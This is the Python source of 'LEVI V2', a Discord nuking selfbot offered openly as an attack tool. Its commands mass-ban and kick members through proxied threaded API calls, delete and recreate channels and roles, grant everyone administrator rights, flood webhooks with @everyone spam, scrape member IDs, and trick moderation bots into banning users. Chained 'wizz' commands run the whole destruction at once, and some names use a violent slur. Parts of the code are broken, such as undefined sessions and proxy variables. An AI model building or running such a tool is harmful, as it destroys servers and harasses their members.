main.py
import discord, time, string, random, requests, datetime, asyncio, json, os, sys, threading, aiohttp, io, logging
from time import sleep
import base64
from discord.ext import commands, tasks
from discord import Permissions
from colorama import Fore, Style
from random import randint
from colored import fg, attr
from itertools import cycle
from requests_futures.sessions import FuturesSession
from webserver import keep_alive
import os


class colors:

    main = fg('#00fefc')
    reset = attr('reset')


os.system(f'cls & title [LEVI V2] - Configuration')

token = "Token"

prefix = ">"
CHANNEL_NAMES = "WIZZED BY Levi"
VCHANNELS_NAMES = "RAPED BY Levi"
CATEGORY_NAMES = "Levi ON TOP"
ROLE_NAMES = "Levi On Top"
Webhook_contents = "@everyone | @here Levi is here"

os.system('cls')
os.system('cls' if os.name == 'nt' else 'clear')
os.system('cls' if os.name == 'nt' else 'clear')


def check_token():
    if requests.get("https://discord.com/api/v8/users/@me",
                    headers={
                        "Authorization": f'{token}'
                    }).status_code == 200:
        return "user"
    else:
        return "bot"


if sys.platform == "linux":
    clear = lambda: sys("clear")
else:
    clear = lambda: sys("cls & mode 70,24")

token_type = check_token()
intents = discord.Intents.all()
intents.members = True
if token_type == 'user':
    headers = {'Authorization': f"{token}"}
    client = commands.Bot(command_prefix=prefix,
                          case_insensitive=False,
                          self_bot=True,
                          intents=intents)
else:
    if token_type == 'bot':
        headers = {'Authorization': f"Bot {token}"}
        client = commands.Bot(command_prefix=prefix,
                              case_insensitive=False,
                              intents=intents)
os.system('cls')

logging.basicConfig(
    level=logging.INFO,
    format=
    f"{colors.main}[{colors.reset}%(asctime)s{colors.main}] \033[0m%(message)s",
    datefmt="%H:%M:%S",
)


@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(
        name='Legend x Levi Op',
        url='https://twitch.tv/legend'))

    print(
        f"{colors.main}┏┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓{colors.main}"
    )
    print(
        f"{colors.main} >{colors.main}Username :{colors.main} {client.user} {colors.main}"
    )
    print(
        f"{colors.main} >{colors.main}guilds :{colors.main} {len (client.guilds)} {colors.main}"
    )
    print(
        f"{colors.main} >{colors.main}Prefix :{colors.main} {client.command_prefix} {colors.main}"
    )
    print(
        f"{colors.main}┗┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛{colors.main}"
    )


@client.command()
async def watch(ctx, *, message):
    await ctx.message.channel(f"**STREAMING {message}**")
    await client.change_presence(activity=discord.Activity(
        type=(discord.ActivityType.watching), name=message))


@client.command()
async def play(ctx, *, message):
    await ctx.message.channel(f"**PLAYING {message}**")
    game = discord.Game(name=message)
    await client.change_presence(activity=game)


@client.command()
async def listen(ctx, *, message):
    await ctx.message.channel(f"**LISTENING TO {message}**")
    await client.change_presence(activity=discord.Activity(
        type=(discord.ActivityType.listening), name=message))


@client.command()
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(name=message,
                               url='https://www.twitch.tv/LEVISelfbot')
    await client.change_presence(activity=stream)


@client.command()
async def dmall(ctx, *, message):
    for user in client.user.friends:
        try:
            await user.send(message)
            print(f"messaged: {user.name}")
        except:
            print(f"couldnt message: {user.name}")


@client.command(aliases=['rs'])
async def renameserver(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


@client.command(aliases=['rc'])
async def renamechannels(ctx, *, name):

    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@client.command(aliases=['rr'])
async def renameroles(ctx, *, name):

    for role in ctx.guild.roles:
        await role.edit(name=name)


@client.command()
async def scrape(ctx):
    await ctx.message.delete()
    mem = ctx.guild.members
    for member in mem:
        try:
            print("Finished scraping")
            mfil = open("Scraped/members.txt", "a")

            mfil.write(str(member.id) + "\n")
            mfil.close()

        except Exception as e:
            print("channels are not created")


def ssspam(webhook):
    while spammingdawebhookeroos:
        data = {'content': '@everyone @here LEVI RUNS CORD '}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@client.command()
async def pings(ctx):
    global spammingdawebhookeroos
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url, )).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 100 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 2
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='LEVI RUNS CORD')
                threading.Thread(target=ssspam, args=(webhook.url, )).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print(f"{Fore.RED} > Webhook Error")


@client.command()
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send('```Banned | HAcker On Top```')


@client.command()
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send('```Kick | LEVI On Top```')


@client.command()
async def adminall(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get((guild.roles), name='@everyone')
        await role.edit(permissions=(Permissions.all()))
        print(Fore.MAGENTA + 'I have given everyone admin.' + Fore.RESET)
    except:
        print(Fore.GREEN + 'I was unable to give everyone admin' + Fore.RESET)


@client.command()
async def lock(ctx):
    await ctx.channel.set_permissions((ctx.guild.default_role),
                                      send_messages=False)
    await ctx.send(ctx.channel.mention + 'SUCCESSFULLY LOCKED')


@client.command()
async def prefix(ctx, prefix):
    client.command_prefix = str(prefix)
    await ctx.message.delete()
    await ctx.send('```YOUR PREFIX HAS BEEN CHANGED```')


@client.command()
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in client.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers +
                   kickPermServers)


@client.command(aliases=['dc'])
async def deletechannels(ctx):
    await ctx.message.delete()
    print(f"{Fore.RED}Deleting Channels . . .")
    for channel in ctx.guild.channels:
        await channel.delete()
    print(f"{Fore.RED} Channels Deleted")


@client.command()
async def nickall(ctx, nickname):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
        except:
            pass


@client.command()
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            print("failed to unban")


@client.command(aliases=['mcat'])
async def masscategory(ctx, amount=250):
    await ctx.message.delete()
    for i in range(amount):
        try:
            await ctx.guild.create_category(random.choice(CATEGORY_NAMES))
            print(f"[{i}] CATEGORY made")
        except:
            print("error making CATEGORY")


@client.command(aliases=['mvc'])
async def voicechannels(ctx, amount=250):
    await ctx.message.delete()
    channels = ctx.guild.channels
    for channels in channels:
        try:
            await channels.delete()
            print(channels.name + " Has been wizzed")
        except:
            pass
            print("error")
            guild = ctx.message.guild
    for i in range(amount):
        try:
            await ctx.guild.create_voice_channel(random.choice(VCHANNELS_NAMES)
                                                 )
            print(f"[{i}] vchannels made")
        except:
            print("error making vchannels")


@client.command(aliases=['mr'])
async def massroles(ctx, amount=250):
    await ctx.message.delete()
    roles = ctx.guild.roles
    for roles in roles:
        try:
            await roles.delete()
            print(roles.name + " Has been wizzed")
        except:
            pass
            print("error")
            guild = ctx.message.guild
    for i in range(amount):
        try:
            await ctx.guild.create_role(random.choice(ROLE_NAMES))
            print(f"[{i}] roles made")
        except:
            print("error making roles")


@client.command(aliases=['mc'])
async def masschannels(ctx, amount=250):
    await ctx.message.delete()
    channels = ctx.guild.channels
    for channel in channels:
        try:
            await channel.delete()
            print(channel.name + " Has been wizzed")
        except:
            pass
            print("error")
            guild = ctx.message.guild
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
            print(f"[{i}] channels made")
        except:
            print("error making channels")

        sleep(10)

    def dc(i):
        sessions.delete(f"https://discord.com/api/v9/channels/{i}",
                        headers=headers,
                        proxies={
                            "http": 'http://' + next(rotating)
                        }).result()

    for i in range(4):
        for channel in list(ctx.guild.channels):
            threading.Thread(target=dc, args=(channel.id, )).start()
            logging.info(f"Deleted channel {channel}.")


@client.command(aliases=['ban2'])
async def massban2(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)

    def mass_ban(i):
        r = sessions.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
                         headers=headers,
                         proxies={
                             "http": 'http://' + next(rotating)
                         }).result()

    try:
        for i in range(3):
            for member in list(ctx.guild.members):
                threading.Thread(target=mass_ban, args=(member.id, )).start()
                logging.info(f"Executed member {member}.")
        clear()
        logging.info("Operation mass ban successful.")
    except Exception as error:
        logging.info("Connection error.")
        sleep(10)


@client.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(f'{message}\n' * 10)


@client.command()
async def massroles2(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)

    def massroles2(i):
        json = {"name": i}
        r = sessions.post(f"https://discord.com/api/v9/guilds/{guild}/roles",
                          headers=headers,
                          json=json)

    for i in range(500):
        threading.Thread(target=massroles2,
                         args=(random.choice(ROLE_NAMES), )).start()
        logging.info(f"Created channel {random.choice(ROLE_NAMES)}.")

    await asyncio.sleep(15)


@client.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  # b'\xfc'
    await ctx.message.delete()
    await client.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in client.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass


@client.command()
async def massban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="LEVI On Top")
        except:
            pass


@client.command()
async def masskick(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="LEVI On Top")
        except:
            pass


@client.command(aliases=['kick2'])
async def masskick2(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)

    def mass_kick(i):
        r = sessions.put(f"https://discord.com/api/v9/guilds/{guild}/kick/{i}",
                         headers=headers,
                         proxies={
                             "http": 'http://' + next(rotating)
                         }).result()

    try:
        for i in range(3):
            for member in list(ctx.guild.members):
                threading.Thread(target=mass_kick, args=(member.id, )).start()
                logging.info(f"Executed member {member}.")
        clear()
        logging.info("Operation mass kick successful.")
    except Exception as error:
        logging.info("Connection error.")
        sleep(10)


@client.command()
async def koyaban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("koya ban " + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)


@client.command()
async def dynoban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("?ban " + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)


@client.command()
async def vortexban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send(">>ban " + member.mention + member.mention +
                                 member.mention + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)


@client.command()
async def wickban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("w!ban " + member.mention)
        await ctx.channel.send(f"y")
        await message.delete()
        await asyncio.sleep(1.5)


@client.command()
async def carlban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("!ban " + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)


@client.command()
async def prune(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        await guild.prune_members(days=1,
                                  compute_prune_count=False,
                                  roles=guild.roles)

    except:
        print(f"{Fore:RED}[ERROR]")


@client.command()
async def swizz(ctx):
    await ctx.channel.send(f">rr LEVI ON TOP")
    await ctx.channel.send(f">rs LEVI RUNS CORD")
    await ctx.channel.send(f">rc LEVI ON TOP ")


@client.command()
async def bwizz(ctx):
    await ctx.channel.send(f">dynoban ")
    await ctx.channel.send(f">vortexban")
    await ctx.channel.send(f">carlban")
    await ctx.channel.send(f">koyaban")


@client.command()
async def pwizz(ctx):
    await ctx.channel.send(f">mcat ")
    await ctx.channel.send(f">mvc")
    await ctx.channel.send(f">masschanels2")
    await ctx.channel.send(f">scrape")
    await ctx.channel.send(f">massban2")
    await ctx.channel.send(f">bwizz")
    await ctx.channel.send(f">pings")
    await ctx.channel.send(f">spam 100 @everyone @here Captain Levi Was Here !"
                           )


@client.command()
async def about(ctx):
    await ctx.send(
        "__**MADE BY Legend. BEST NUKING SB IN DISCORD | Join https://discord.gg/recaptcha**__"
    )


keep_alive()
client.run(token, bot=False)
